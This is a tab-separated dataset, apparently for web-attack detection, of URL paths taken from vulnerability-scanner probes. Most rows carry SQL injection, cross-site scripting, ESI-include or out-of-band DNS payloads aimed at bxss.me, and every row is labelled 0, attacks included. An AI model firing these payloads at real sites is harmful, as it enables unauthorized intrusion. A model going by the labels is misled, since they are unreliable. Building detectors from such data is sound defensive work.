sentences	labels
/**/user/gallery1.php?g_name=<script>alert(77729</script> \r\n\r\n 	 0
/col' and 2*3*8=6*8 and 'jn59'='jn59/******/index.html \r\n\r\n 	 0
/****/swb/ltgsz.com?n=11');select pg_sleep(5)-- \r\n\r\n 	 0
/*/public/viewclick/?addclick=1&classid=0'xor(if(now()=sysdate(),sleep(3),0))xor'z&id=270 \r\n\r\n 	 0
/*****/index/goods'||'/ \r\n\r\n 	 0
/*****/system/2021/11/13/javascript:void(0); \r\n\r\n 	 0
/****/tools_log_setting.php?action_post=something&send_mail=--><script>alert(777)</script>&apply=save settings&log_sys=1&log_dbg=1&log_att=1&log_drp=1&log_ntc=1&email_addr=&subject=&sender=&srv=&srv_port=25 \r\n\r\n 	 0
/****/workstationscheduleinformanager/queryshowshifts.do \r\n\r\n 	 0
socket.gethostbyname('hitbr' 'odaovham1f531.bxss.me.')[3].to_s) '/***************/16/images/plugin/voice/voice.css \r\n\r\n 	 0
/**********/system/2021/12/11/javascript:void(0); \r\n\r\n 	 0
/****/category/quanqiuguanzhuredian?page=1 and 1184=1184# \r\n\r\n 	 0
/*****/system/2013/11/13/011232580.shtml \r\n\r\n 	 0
/****/zfwjn/1079/1081/http://bxss.me/t/fit.txt.html \r\n\r\n 	 0
/******/js/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase \r\n\r\n 	 0
/******/libs/magpierss/scripts/magpie_simple.php?url=""><img src= x onerror = alert(777)>url=""> \r\n\r\n 	 0
/**/system/2021/08/17/javascript:void(0); \r\n\r\n 	 0
/**********/system/2020/08/06/javascript:window.print() \r\n\r\n 	 0
/**********/2021-0'xor(if(now()=sysdate(),sleep(9),0))xor'z-31.html \r\n\r\n 	 0
/************/template/'""()&%<acx><script >efoq(9397)</script>/110105008056111/16/images/hanweb.css \r\n\r\n 	 0
/****/abantecart/index.php?currency="><script>alert(777);</script>&product_id=109"><script>alert(777);</script>&rt=product/product \r\n\r\n 	 0
/**/advanced-search/?term=asdf&"><script>alert(777)</script> \r\n\r\n 	 0
/****/admin/upgrade_unattended.php?db_type=<script>alert(777)</script> \r\n\r\n 	 0
/**/atutor/mods/_standard/calendar/getlanguage.php?token=calendar_next<script>alert(777)</script>&pub=1 \r\n\r\n 	 0
/****/xxgkml/zdxm_3700/list.html?new="".gethostbyname(lc(""hityz"".""dganuxca53087.bxss.me."")).""a"".chr(67).chr(hex(""58"")).chr(103).chr(85).chr(117).chr(88)."" \r\n\r\n 	 0
/*******/gx8fob2.php \r\n\r\n 	 0
/****/zgsdt/zgs17_6389/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase \r\n\r\n 	 0
/*******/template/jcse/110105008056111/16/images/plugin/mainframe/spellcheck.js \r\n\r\n 	 0
/****/wp-admin/admin-ajax.php \r\n\r\n 	 0
/****/web/search?page=2&channelid=253477&searchword=1&keyword=1&orderby=-docreltime&perpage=15') or 4345=0291  \r\n\r\n 	 0
/***/?refresh=';window.top._web_js_namespace_taint_tracer.log_execution_flow_sink()'// \r\n\r\n 	 0
/****/user/job/lib/ap_resume_intention.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects1) \r\n\r\n 	 0
/**/0""xor(if(now()=sysdate(),sleep(15),0))xor""z/script/ui.js \r\n\r\n 	 0
/******/_content/download.jsp?urltype=news.downloadattachurl%') or 2917=2857 and '%'='&owner=1707212448&wbfileid=51419 \r\n\r\n 	 0
/************/template/jcse/bxss.me/16/images/catesearchbtn.js \r\n\r\n 	 0
/****/web/search?channelid=299868&perpage=-1 or 8767=4313 \r\n\r\n 	 0
/**/ui/lib/easyui/plugins/if(now()=sysdate(),sleep(15),0).js \r\n\r\n 	 0
/****/http://bxss.me/t/fit.txt/sz/202108/t20210806_185416.html \r\n\r\n 	 0
/******/20140319a.swf/""><script>alert(512)</script> \r\n\r\n 	 0
/****/zfwjn/1088/1094/list.html?new=0.42120017961088885'""()&%<acx><script >qtdr(9506)</script> \r\n\r\n 	 0
/****/http://bxss.me/t/fit.txt/demo12.html \r\n\r\n 	 0
/******/system/2021/06/09'""/><img src=javascript:alert(2352)>/013399706.shtml \r\n\r\n 	 0
/********/en-gb/cons.php \r\n\r\n 	 0
/**/bxss.me/lib/easyui/plugins/jquery.panel.js \r\n\r\n 	 0
/******/jslib/ckplayer/ckplayer.js/"><script>alert(7685)</script>?_=1630312671455 \r\n\r\n 	 0
/****/web/search?x=*/-->'""></iframe></script></style></title></textarea><script >alert(37777)</script> \r\n\r\n 	 0
/*********/treasury/index.aspx?nodeid=394') and 4446=(select 4446 from pg_sleep(5)) and ('kdry'='kdry \r\n\r\n 	 0
/***/2021/10/http://bxss.me/t/fit.txt/art_31_242050.html \r\n\r\n 	 0
/******/admin/index.php?o=panel&a=receiver.edit&id=alert(777) \r\n\r\n 	 0
/****/cometchat/plugins/handwrite/index.php?id="">alert(777) \r\n\r\n 	 0
/****/20211214/javascript:void(0); \r\n\r\n 	 0
/xwdt%' and 2*3*8=6*8 and 'l4st'!='l4st%/****/zjdt/gzdt/1.htm \r\n\r\n 	 0
/**/system/2020/06/16/javascript:void(0); \r\n\r\n 	 0
/****/ssgs/kmbg/ \r\n\r\n 	 0
/************/template/jcse/110105008056111/16/images/plugin/websitechange/zwdt_v3'""()&%<acx><script >f58x(9980)</script>.css \r\n\r\n 	 0
/****/zjdt/gcjsbzgl/gzdt/command/ \r\n\r\n 	 0
/**********/system/2021/10/18/javascript:void(0); \r\n\r\n 	 0
/**/user/job/lib/ap_resume_intention.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects1) \r\n\r\n 	 0
/****/category/zhixun?page=1 and 3198=7235# \r\n\r\n 	 0
/************/template/jcse/110105008056111/16/images/plugin/selectpick<esi:include src=""http://bxss.me/rpb.png""/>/js.js \r\n\r\n 	 0
/******/web/jpage/dataproxy.jsp/"><script>alert(3378)</script>?startrecord=1&endrecord=45&perpage=15 \r\n\r\n 	 0
/************/template/jcse'""()&%<acx><script >ke7r(9291)</script>/110105008056111/16/images/result.css \r\n\r\n 	 0
/****/web/search?channelid=234439&orderby=relevance&perpage=24&searchword=1 and 7175=7746-- \r\n\r\n 	 0
/********/advanced-search/?term=asdf&"><script>alert(777)</script> \r\n\r\n 	 0
/****/web/search?channelid=254846&searchword=天津 and 6405=4849-- efqi \r\n\r\n 	 0
/**/0""xor(if(now()=sysdate(),sleep(15),0))xor""z/lib/easyui/plugins/jquery.draggable.js \r\n\r\n 	 0
/***/index.php?do=post&id=485&c=dt&a=goods& \r\n\r\n 	 0
/******/_content/download.jsp?owner=746124344&urltype=news.downloadattachurl&wbfileid=if(now()=sysdate(),sleep(12),0) \r\n\r\n 	 0
/**/index.php?m=member&c=index&a=register&siteid=1 \r\n\r\n 	 0
/****/web/search?channelid=222832&outlinepage=10&page=4172&perpage=20'; waitfor delay '0:0:2 \r\n\r\n 	 0
/****/zjdt/jzgl/gzdt%' and 2*3*8=6*8 and '4l9t'!='4l9t%/1.htm \r\n\r\n 	 0
/investors-garden/0""xor(if(now()=sysdate(),sleep(12),0))xor""z/*******/2020-02-27/8981.html \r\n\r\n 	 0
/****/xxgknb/2013/list'||'.html \r\n\r\n 	 0
/************/template'||'/jcse/110105008056111/16/images/css.js \r\n\r\n 	 0
/*******/5zt0l.php \r\n\r\n 	 0
/************/search.do?tpl=16&pq=1&begin=1&websiteid=110105008056111&end=1&pos=1&q=请输入关键词%' and 2*3*8=6*8 and 'czye'!='czye%&eq=1&pg=1&searchid=1&oq=1&p=1 \r\n\r\n 	 0
/**/ui/'""()&%<acx><script >vejj(9123)</script>/hanweb/ie6fixed/ie6fixed.js \r\n\r\n 	 0
/************/categorysearch.do?cateid=1&p=1&q=请输入关键词&searchid=1"onmouseover=hzph(98422)"&tpl=16&websiteid=110105008056111 \r\n\r\n 	 0
/if(now()=sysdate(),sleep(15),0)/**/widgets/hanweb/placeholder/placeholder.js \r\n\r\n 	 0
/****//121/7affor0w/xhr_send?t=1632397004663 \r\n\r\n 	 0
/**/ui/http://bxss.me/t/fit.txt?.jpg/easyui/plugins/jquery.panel.js \r\n\r\n 	 0
/****/main/calendar/agenda_list.php?type=personal' onmouseover='confirm(777)'/><!-- \r\n\r\n 	 0
/****/category/zixunfuwu?page=1') and 1=dbms_pipe.receive_message(chr(90)||chr(80)||chr(71)||chr(74),0)--  \r\n\r\n 	 0
/******/hhs/jrtt/<img src="javascript:alert(28)"> \r\n\r\n 	 0
/******/20140319a.swf/<img src="javascript:alert(520)"> \r\n\r\n 	 0
/*****/zzjg/if(now()=sysdate(),sleep(15),0)/ \r\n\r\n 	 0
/****/index.cfm?email="">alert(777)&fuseaction=clogin.main&returnurl=1&status=sendlogin \r\n\r\n 	 0
/*****/system/2019/06/14/javascript:void(0); \r\n\r\n 	 0
/**/server/news/show/title/"><script>alert(777)</script>time-for-a-heavy-harvest-new-release/src/@random4cd201e063d5c \r\n\r\n 	 0
/******/static/layer/e,n.complete?t(n):(n.onload=function(){n.onload=null,t(n)},void(n.onerror=function(e){n.onerror=null,i(e)}))}var \r\n\r\n 	 0
/****/web/sa2/scriptlist.do?gui_pagenotabledata=><script>alert(777)</script> \r\n\r\n 	 0
/jsearchfront'""()&%<acx><script >47ey(9174)</script>/********/jcse/website.js \r\n\r\n 	 0
/****/system/2021/12/15/javascript:void(); \r\n\r\n 	 0
/****/jgzn/0""xor(if(now()=sysdate(),sleep(12),0))xor""z.htm \r\n\r\n 	 0
/****/web/sa3/addholiday.do \r\n\r\n 	 0
/**/api-getmodel-api-sql-sql=select concat(account,0x7a656e74616f636d735f73716c5f73716c69) from zt_user \r\n\r\n 	 0
/****/server/news/show/title/"><script>alert(777)</script>time-for-a-heavy-harvest-new-release/src/@random4cd201e063d5c \r\n\r\n 	 0
/****/actionhandler/ajax_managed_services.php \r\n\r\n 	 0
/***/nbhd/opengovmsgbox.do?appid=4"and"g"="g&method=listgovmsgboxs&pagesize=3&siteid=115 \r\n\r\n 	 0
/******/qhkc/? \r\n\r\n 	 0
/'""()&%<acx><script >ysri(9511)</script>/****/sgaj/201812/t20181208_112298.html \r\n\r\n 	 0
/****/bysw/202007/t20200701_168744.html?leader=徐　峰<esi:include src=""http://bxss.me/rpb.png""/> \r\n\r\n 	 0
/images"" and 2*3*8=6*8 and ""nyhr""=""nyhr/*/hanweb.css \r\n\r\n 	 0
/***/interface/comul_total.json.jsp?callback=jquery171030196352313975305_1632325579271%' or 3452=3452 and '%%'='% \r\n\r\n 	 0
/****/if(now()=sysdate(),sleep(12),0)/ncwywfgz/ycs/hlx/xmb_gzdxb.htm \r\n\r\n 	 0
/****/photostore/workbox.php?mode=addtolightbox&mediaid=""><script>alert(777)</script> \r\n\r\n 	 0
/info%' and 2*3*8=6*8 and 'm984'!='m984%/****/25187.htm \r\n\r\n 	 0
/***/rest/prototype/1/session/check/something<img src=a onerror=alert(777)> \r\n\r\n 	 0
/ztzl' and 2*3*8=6*8 and '01um'='01um/******/zcwj/1.htm \r\n\r\n 	 0
/****/czgk/bmyjs/zzqzfzcbmyzstsjg/zzqmw/\"javascript:void(0)\" \r\n\r\n 	 0
/if(now()=sysdate(),sleep(15),0)/******/tjj/ \r\n\r\n 	 0
/**/?icl_action=reminder_popup&target=javascript:alert(777);// \r\n\r\n 	 0
/*****/jspmyadmin/tabledata.jsp?server=localhost&db=mysql&table=""/>alert(777); \r\n\r\n 	 0
/****/长江三角洲?page=1'""()&%<acx><script >ym7q(9769)</script> \r\n\r\n 	 0
/******/download/downfile.jsp?classid=0&filename=06c080ad774b497c8312530658e028b8.doc and 1=1 \r\n\r\n 	 0
/****/admin/dash_status.php?status_data[1]=alert(777); \r\n\r\n 	 0
/wp-content/******/kava/tundou.php \r\n\r\n 	 0
/*******/zkboat.php \r\n\r\n 	 0
/***/news/"><script>alert(777)</script>show/title/time-for-a-heavy-harvest-new-release/src/@random4cd201e063d5c \r\n\r\n 	 0
/******/resource/0""xor(if(now()=sysdate(),sleep(12),0))xor""z/news/newscontent.js \r\n\r\n 	 0
/*****/system/2020/07/31/javascript:window.close(); \r\n\r\n 	 0
/****/news/"><script>alert(777)</script>show/title/time-for-a-heavy-harvest-new-release/src/@random4cd201e063d5c \r\n\r\n 	 0
/****/finderview/api.php?callback=jquery211027821724654516156_1466662510279}}1c027<script>alert(777)</script>cf2ea&type=get&mode=0&_=1466662510280 \r\n\r\n 	 0
/******/system/2016/06/08/javascript:window.print() \r\n\r\n 	 0
/skin'||'/**/encrypt/md5.js \r\n\r\n 	 0
/***********/jinrongqihuo/guzhiqihuo/index'||'_2.html \r\n\r\n 	 0
/******/api-getmodel-api-sql-sql=select concat(account,0x7a656e74616f636d735f73716c5f73716c69) from zt_user \r\n\r\n 	 0
/**********/system/2015/01/16/011611507.shtml \r\n\r\n 	 0
/******/system/2020/06/04/javascript:window.close(); \r\n\r\n 	 0
/****/zdlygk/ncwywfgz/zws/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/xmb_gzdxb.htm \r\n\r\n 	 0
/****/zcwjk'||'/flfg.htm \r\n\r\n 	 0
/********/wp-admin/post-new.php?post_type=inbound-forms&post='>alert(777) \r\n\r\n 	 0
/******/resource/interview/room.jsp?wbinterviewid=1033&owner=1707212448' or 3705=3705  \r\n\r\n 	 0
/****/lsgj/api-getmodel-api-sql-sql=select concat(account,0x7a656e74616f636d735f73716c5f73716c69) from zt_user \r\n\r\n 	 0
/*******/42n0f09.php \r\n\r\n 	 0
/****/web/search?iptsword=*/-->'""></iframe></script></style></title></textarea><script >alert(37197)</script> \r\n\r\n 	 0
/******/visitcount/visit.jsp?type=3&i_webid=1&i_columnid=390&i_articleid=182841 \r\n\r\n 	 0
/**/ui/widgets/cookie/jquery.cookie<esi:include src=""http://bxss.me/rpb.png""/>.js \r\n\r\n 	 0
/**/index.php?title=acunetixtest1a3968&action=submit \r\n\r\n 	 0
/****/xxgknb/2014/list' and 2*3*8=6*8 and 'uyof'='uyof.html \r\n\r\n 	 0
/****/web/search?searchword=1&channelid=287219&perpage=24&templet=1' or 4025=1515 and '1'='1&token=1 \r\n\r\n 	 0
/******/if(now()=sysdate(),sleep(15),0)/lmy.css \r\n\r\n 	 0
/**********/index.php?currency="><script>alert(777);</script>&product_id=109"><script>alert(777);</script>&rt=product/product \r\n\r\n 	 0
/******/qhkc/javascript:void(0) \r\n\r\n 	 0
/****/byyw/202102/t20210218_177604.html" target=_blank><img src="./fzgn/xctf/202102/w020210218596657055452.jp \r\n\r\n 	 0
/**/admin/upgrade_unattended.php?db_type=<script>alert(777)</script> \r\n\r\n 	 0
/****/system/2021/08/04/javascript:void(); \r\n\r\n 	 0
/**/general/diary/new/submit.php \r\n\r\n 	 0
/****/web/search?page=2%') or 2512=2512 /*&channelid=253477&searchword=1&keyword=1&orderby=-docreltime&perpage=15&outlinepage=10 \r\n\r\n 	 0
/************/template/jcse/110105008056111/16/images/plugin/mainframe/spellcheck<esi:include src=""http://bxss.me/rpb.png""/>.js \r\n\r\n 	 0
/****/0'xor(if(now()=sysdate(),sleep(15),0))xor'z/ \r\n\r\n 	 0
/****/advanced-search/?term=asdf&"><script>alert(777)</script> \r\n\r\n 	 0
/ldzc'""()&%<acx><script >qjl0(9207)</script>/****/202001/t20200119_146666.html \r\n\r\n 	 0
/****/zpdt/202008/t20200807_251715.html' and 'x'='y \r\n\r\n 	 0
/***/interface/daily_clickcount.json.jsp?callback=jquery171030196352313975305_1632325579270') or 4517=4517 /* \r\n\r\n 	 0
/****/20211216/javascript:void(0); \r\n\r\n 	 0
/****/zjdt/jsgcxfjg/0""xor(if(now()=sysdate(),sleep(12),0))xor""z.htm \r\n\r\n 	 0
/******/resource/js'||'/image/imagescroll.js \r\n\r\n 	 0
/****/web/search?channelid=234439&orderby=relevance&perpage=24') and 1558=6627 and '1'='1&searchword=1 \r\n\r\n 	 0
/****/whhd/202105/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase \r\n\r\n 	 0
/************/bxss.me/jcse/110105008056111/16/images/plugin/mainframe/spellcheck.js \r\n\r\n 	 0
/****/xxgknb/2013/list.html?new="".gethostbyname(lc(""hityi"".""cczynkxhd9418.bxss.me."")).""a"".chr(67).chr(hex(""58"")).chr(106).chr(68).chr(114).chr(79)."" \r\n\r\n 	 0
/investors-garden/**********/video' and 2*3*8=6*8 and 'th6d'='th6d/ \r\n\r\n 	 0
/**/user/job/lib/ap_resume_workcity.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects) \r\n\r\n 	 0
/****/system/2020/07/15/javascript:window.print() \r\n\r\n 	 0
/******/visitcount/visit.jsp?type=2&i_columnid=37&i_webid=1' and 'x'='y \r\n\r\n 	 0
/*******/action.ashx?cmd=photosquaregetphotosearchlist \r\n\r\n 	 0
/*****/system/2021/01/21/javascript:void(); \r\n\r\n 	 0
/******/jslib/ckplayer/ckplayer.js/""><script>alert(4821)</script> \r\n\r\n 	 0
/******/if(now()=sysdate(),sleep(12),0)/js/vsb_news_search.js \r\n\r\n 	 0
/****/bxss.me/bmjs/qtdw/ \r\n\r\n 	 0
/****/frontcontroller?domainname=<script>alert(77729</script>&operation=160 \r\n\r\n 	 0
/**/gywm_10175/ \r\n\r\n 	 0
/**/system/2021/10/17/javascript:void(0); \r\n\r\n 	 0
/*******/fzatt.php \r\n\r\n 	 0
/*/210719/index/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase \r\n\r\n 	 0
/***/nbhd/opengovmsgbox.do?pageindex=1&siteid=115'; waitfor delay '0:0:2&method=listgovmsgboxs&pagesize=15&appid=4 \r\n\r\n 	 0
/****/zzxxgk/bxss.me/ \r\n\r\n 	 0
/***/player.swf?autostart=true&file="'><img src="/wf_xsrf2842.html"> \r\n\r\n 	 0
/*/'""()&%<acx><script >rcwk(9570)</script>-1/index/06defa41f3b0c6ebc8da65f95d7f2f20.css \r\n\r\n 	 0
/****/czgk/bmyjs/qtdw/zzqtdzscbj/\"javascript:void(0)\" \r\n\r\n 	 0
/****/byszf/http://bxss.me/t/xss.html? \r\n\r\n 	 0
/******/_content/download.jsp?urltype=news.downloadattachurl&owner=1707212448&wbfileid=51419' and 5813=5685 and '1'='1 \r\n\r\n 	 0
/****/上海?page=1'""()&%<acx><script >lmfv(9673)</script> \r\n\r\n 	 0
/********/wf_get_fields_approve.aspx?template_id=sys.fn_varbintohexstr(hashbytes('md5','a8baz')) \r\n\r\n 	 0
/***/003/001/764/00300176470_f7fb90b1.jpg \r\n\r\n 	 0
/****/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/ncwywfgz/wzs/ltq/xmb_gzdxb.htm \r\n\r\n 	 0
/****/zzxxgk/tjj/zfxxgkml_2127/jytabljg_2061/list%' and 2*3*8=6*8 and 'tb8j'!='tb8j%.html \r\n\r\n 	 0
/*****/gywm/flgw/"><script>alert(222)</script> \r\n\r\n 	 0
/jsearchfront'""()&%<acx><script >xiko(9352)</script>/********/jcse/110105008056111/16/images/condition.js \r\n\r\n 	 0
/******/system/2017/03/05/javascript:void(0); \r\n\r\n 	 0
/0'xor(if(now()=sysdate(),sleep(15),0))xor'z/*****/grouppic/jquery.ad-gallery2.css \r\n\r\n 	 0
/****/web/search?channelid=299868&perpage=1000' and 8055=7999 and '1'='1 \r\n\r\n 	 0
/xxgk%' and 2*3*8=6*8 and 'hjq5'!='hjq5%/*****/1088/1110/list.html \r\n\r\n 	 0
/******/qhqy/index.shtml/"><script>alert(206)</script> \r\n\r\n 	 0
/****/js/lib/json2.js;;";;alert(271);;s=" \r\n\r\n 	 0
/****/tpgj/fprw/202011/t20201124_256587.html \r\n\r\n 	 0
/****/web/search/search?page=3&channelid=287219&searchword=1';select pg_sleep(5)--&keyword=1&orderby=-docreltime&perpage=7&outlinepage=10 \r\n\r\n 	 0
/'""()&%<acx><script >wbdy(9863)</script>/*/xys.css \r\n\r\n 	 0
/******/resource/code/datainput.jsp?owner=') or 4664=4664 and '1'='1 \r\n\r\n 	 0
/***/abantecart/index.php?rt=product/manufacturer&manufacturer_id=15"><script>alert(777);</script> \r\n\r\n 	 0
/***/index.php?action=list&order=nan"/><script>alert(777);</script>me&srt=yes \r\n\r\n 	 0
/****/xxgknb/2014//xfs.bxss.me.html \r\n\r\n 	 0
/******/resource/interview/room.jsp?wbinterviewid=1033') and 3450=7095 and ('1'='1&owner=1707212448 \r\n\r\n 	 0
/ldzc'||'/*****/201610/t20161016_531.html \r\n\r\n 	 0
/******/jslib/ckplayer/ckplayer.js/""><script>alert(851)</script>?_=1630311620917 \r\n\r\n 	 0
/****/zgsdt/2021_qydt/202108/t20210824_314999.html and 1=1 \r\n\r\n 	 0
/****/web/search/search?page=3' and 6956=6956 and 'rrsg'='rrsg&channelid=287219&searchword=1&keyword=1&orderby=-docreltime&perpage=7&outlinepage=10 \r\n\r\n 	 0
/***/mobile_h5/waparticledetail.do?article_id=202103081531201122&contenttype=article \r\n\r\n 	 0
/****/yqzt/mtjs/202011/t20201116_255997.html' and 'x'='x \r\n\r\n 	 0
/******/visitcount/visit.jsp/<img src="javascript:alert(245)">?type=1&i_webid=1&i_columnid=1 \r\n\r\n 	 0
/**/system/2020/06/15/javascript:void(0); \r\n\r\n 	 0
/**/main/admin/session_edit.php?page=resume_session.php" onmouseover=confirm(777)//&id=1 \r\n\r\n 	 0
/cgi-bin/****/job/lib/ap_resume_intention.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects) \r\n\r\n 	 0
/*/191211-8'""()&%<acx><script >br7s(9040)</script>/index/d7c921b2c59d284228d4f6d2d18d0cae.css \r\n\r\n 	 0
/****/gjzqq/index.html?continent=' and 6912=8727 and '1'='1 \r\n\r\n 	 0
/*****/index/goods/cate_id' and 2*3*8=6*8 and 'kw77'='kw77/179.html \r\n\r\n 	 0
/****/category/maoyizixun?page=1 and 5206=7590-- \r\n\r\n 	 0
/***/admin/edit.php?title="">pt>alert(777);< /script>pt> \r\n\r\n 	 0
/******/_content/download.jsp?urltype=news.downloadattachurl&owner=1707212448%') or 0517=6549  \r\n\r\n 	 0
/******/visitcount/visit.jsp?i_columnid[0]==convert(int,sys.fn_sqlvarbasetostr(hashbytes('md5','1134160791')))and 3 in &i_columnid[1]=3&i_webid=1&type=1 \r\n\r\n 	 0
/****/bysrd/201612/t20161202_79141.html?leader=宿俊乾<esi:include src=""http://bxss.me/rpb.png""/> \r\n\r\n 	 0
/************/template/jcse/110105008056111/16/images/plugin/selectpick/http://bxss.me/t/fit.txt?.jpg.js \r\n\r\n 	 0
/****/tzgg/2021_tzgg/202102/javascript:stranbody(); \r\n\r\n 	 0
/****/xxgkzd/list.html?new="".gethostbyname(lc(""hitfm"".""joixrmbzb6731.bxss.me."")).""a"".chr(67).chr(hex(""58"")).chr(120).chr(75).chr(108).chr(84)."" \r\n\r\n 	 0
/******/web/jpage/theme/default/0'xor(if(now()=sysdate(),sleep(15),0))xor'z/jpage.css \r\n\r\n 	 0
/****/yqzt/jtddt/202005/t20200506_246694.html and 1=1 \r\n\r\n 	 0
/*****/index'||'/lists/cate_id/154.html \r\n\r\n 	 0
/****/20200114/javascript:void(0); \r\n\r\n 	 0
/*******/otzf.php \r\n\r\n 	 0
/****/rdjy/bxss.me/t20201225_2539623.html \r\n\r\n 	 0
/****/web/search/search?page=3&channelid=287219&searchword=1&keyword=1 and 8449=4529-- nzps&orderby=-docreltime&perpage=7&outlinepage=10 \r\n\r\n 	 0
/****/system/2015/03/12/javascript:window.print() \r\n\r\n 	 0
/******/system/2017/07/15/javascript:window.close(); \r\n\r\n 	 0
/****/bmkx'""()&%<acx><script >hvqt(9470)</script>/ \r\n\r\n 	 0
/*****/snhxg/date.php \r\n\r\n 	 0
/****/system/2021/09/07'"/>/</script/>/<svg/onload=alert(1512) width=100//>/013446963.shtml \r\n\r\n 	 0
/****/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase \r\n\r\n 	 0
/*******/hj4.php \r\n\r\n 	 0
/*****/system/2021/01/21/013323672'""/>< \r\n\r\n 	 0
/****/zzxxgk/tjj/zfxxgkml_2127/jytabljg_2061/list<esi:include src=""http://bxss.me/rpb.png""/>.html \r\n\r\n 	 0
/***/interface/daily_clickcount.json.jsp?callback=jquery171030196352313975305_1632325579270%' or 1362=9025 # \r\n\r\n 	 0
/xxgk'||'/******/tjj/zfxxgkml_2127/hygq_2064/list.html \r\n\r\n 	 0
/****/system/2021/06/18/javascript:window.close(); \r\n\r\n 	 0
/module"" and 2*3*8=6*8 and ""of8r""=""of8r/***/jpage/theme/default/css/jpage.css \r\n\r\n 	 0
/******/20190505/javascript:void(0); \r\n\r\n 	 0
//***********/xxgkml/lzyj/ \r\n\r\n 	 0
/****/system/2021/04/22'""/><script>alert(2424)</script>/013373702.shtml \r\n\r\n 	 0
/zwgk<esi:include src=""http://*******/rpb.png""/>/czgk/bmjs/gdyx/ \r\n\r\n 	 0
/**/ui/script%' and 2*3*8=6*8 and 'eyxe'!='eyxe%/ui.js \r\n\r\n 	 0
/************/template/http://bxss.me/t/fit.txt?.jpg/110105008056111/16/images/plugin/voice/hzrecorder.js \r\n\r\n 	 0
/****/web/search?channelid=-1) or 2976=5633#&perpage=1000 \r\n\r\n 	 0
/******/resource%' and 2*3*8=6*8 and 'phhy'!='phhy%/js/ajax.js \r\n\r\n 	 0
/****/mswpmm/common/newaccount.aspx?btncancel=alert(777) \r\n\r\n 	 0
/***/user/job/lib/ap_resume_intention.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects) \r\n\r\n 	 0
/***/system/panels/page/preview_as_user/preview?cid=""></iframe><svg/onload=alert(""22xwqvvclmxx27wi2bpqzpjy3kd"")> \r\n\r\n 	 0
/***/mswpmm/common/newaccount.aspx?email=alert(777) \r\n\r\n 	 0
/****/web/search?page=2&channelid=253477&searchword=1&keyword=1&orderby=-docreltime&perpage=15%' or 0777=1304 and '%'='&outlinepage=10 \r\n\r\n 	 0
/**/system/2021/08/25/javascript:void(0); \r\n\r\n 	 0
/****/zt/0'xor(if(now()=sysdate(),sleep(15),0))xor'z/ \r\n\r\n 	 0
/**********/system/2015/03/05/011652072.shtml \r\n\r\n 	 0
/*******/12l0vf7.php \r\n\r\n 	 0
/******/resource/interview/room.jsp?wbinterviewid=1033') or 0917=0917 and '1'='1&owner=1707212448 \r\n\r\n 	 0
/**/thumb.php?src=<body onload=alert(777)>.jpg \r\n\r\n 	 0
/****/web/search?page=2&channelid=253477&searchword=1&keyword=1&orderby=-docreltime%' or 6646=6646  \r\n\r\n 	 0
/******/system/2020/10/16/javascript:void(); \r\n\r\n 	 0
socket.gethostbyname(""hitoz"" ""pfurwpvu3d6b4.bxss.me."")[3].to_s) ""/**/images/main.css \r\n\r\n 	 0
/****/yt.php \r\n\r\n 	 0
/****/mtgz/2015_mtdt/javascript:stranbody(); \r\n\r\n 	 0
/****/zjdt/zfgjjjg/gzdt/index.jsp \r\n\r\n 	 0
/****/mtgz/2020_mtgz/' and 'x'='x \r\n\r\n 	 0
/******/457/hanweb.min' and 2*3*8=6*8 and 'rsxk'='rsxk.css \r\n\r\n 	 0
/**/ui/widgets'||'/hanweb/validity/validity.js \r\n\r\n 	 0
/****/dbgd/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase \r\n\r\n 	 0
/****/xyfw/jcjg/" and "x"="x \r\n\r\n 	 0
/******/download/downfile.jsp?classid=0') and 4461=4461 and ('wnds'='wnds&filename=8ffb8746f7374969ba1a903f538b94d4.doc \r\n\r\n 	 0
/****/category/:http://bxss.me/t/xss.html? \r\n\r\n 	 0
/****/api/sources?resource=alert(/777/)&format=txt \r\n\r\n 	 0
/****/gccb/gcsg/ \r\n\r\n 	 0
